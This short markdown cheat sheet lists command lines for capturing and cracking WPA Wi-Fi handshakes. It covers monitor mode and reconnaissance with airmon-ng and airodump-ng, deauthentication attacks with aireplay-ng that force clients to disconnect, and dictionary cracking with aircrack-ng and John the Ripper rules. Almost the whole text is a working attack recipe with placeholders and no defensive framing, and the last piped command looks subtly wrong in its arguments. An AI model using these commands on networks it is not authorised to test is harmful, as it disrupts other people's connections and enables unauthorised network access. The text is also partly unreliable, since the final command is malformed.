# Capturing handshakes  

## Starting monitor mode  
```sudo airmon-ng start wlan0 ```

## Starting monitor mode and setting a channel  
```sudo airmon-ng start wlan0 3  ```

## Recon - see all  
```sudo airodump-ng wlan0mon```

## Recon specific (monitor channel 3)
```
sudo airmon-ng start wlan0 3
sudo airodump-ng -b <bssid> -e <essid> wlan0mon -w <fileprefix>
```
Then deauth from another shell or wifi card:
```sudo aireplay-ng -0 5 -a <BSSID> -c <client MAC> wlan0mon```

# Cracking handshakes

## Aircrack-ng
```aircrack-ng -w <path to wordlist> -e <ESSID> -b <BSSID> <capture filename>```

Aircrack with john rules
sudo john --wordlist=<path to wordlist> --rules --stdout | aircrack-ng -e <ESSID> -b <BSSID> -w <capture filename>

